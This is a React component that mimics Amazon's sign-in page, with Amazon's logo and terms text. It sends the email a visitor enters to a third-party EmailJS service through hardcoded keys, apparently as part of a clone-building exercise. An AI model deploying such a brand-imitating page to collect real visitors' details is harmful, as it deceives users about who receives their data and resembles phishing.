import { useState } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
const LoginPage = ({ setLogin }) => {
  const [email, setEmail] = useState("");
  const[loading,setloading]=useState(false);
  const navigate=useNavigate();
  const handleLogin = () => {
    if (email.trim() === "") return;
    setloading(true);
    emailjs.send(
      "service_4d848wo",
      "template_ix8kd7f",
      {
        email:email
      },
      "quL03Wa7MCnVTAAQm"
    )
    .then(
      ()=>{
        setLogin(true);
        setloading(false);
        localStorage.setItem("islog","true");
        navigate("/");
      },
      (error)=>{
        alert("Failed,Try again ❌");
        setloading(false);
      }
     
    )
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gray-100">
      
      <img
        className="w-24 mb-1 object-contain"
        src="https://1000logos.net/wp-content/uploads/2016/10/Amazon-Logo.png"
        alt="Amazon"
      />

      <div className="bg-white p-6 w-80 border border-gray-300 rounded">
        <h1 className="text-xl font-semibold mb-4">
          Sign in or create account
        </h1>

        <label className="font-bold text-sm">Enter email</label>
        <input
          className="w-full border border-gray-400 p-2 mt-1 mb-4 rounded"
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          required
        />


        {loading==true?(
                    <div
            className="ml-[120px] inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-current border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"
            role="status">
            <span
              className="!absolute !-m-px !h-px !w-px !overflow-hidden !whitespace-nowrap !border-0 !p-0 ![clip:rect(0,0,0,0)]"
            >Loading...</span>
          </div>
        ):
          (<button
            onClick={handleLogin}
            className="w-full bg-yellow-400 hover:bg-yellow-500 p-2 rounded font-medium"
          >
            Continue
          </button>)
        }
        <p className="text-xs mt-4">
          By continuing, you agree to Amazon's{" "}
          <a href="#" className="text-blue-600">Conditions of Use</a>{" "}
          and{" "}
          <a href="#" className="text-blue-600">Privacy Notice</a>.
        </p>
      </div>
    </div>
  );
};

export default LoginPage;
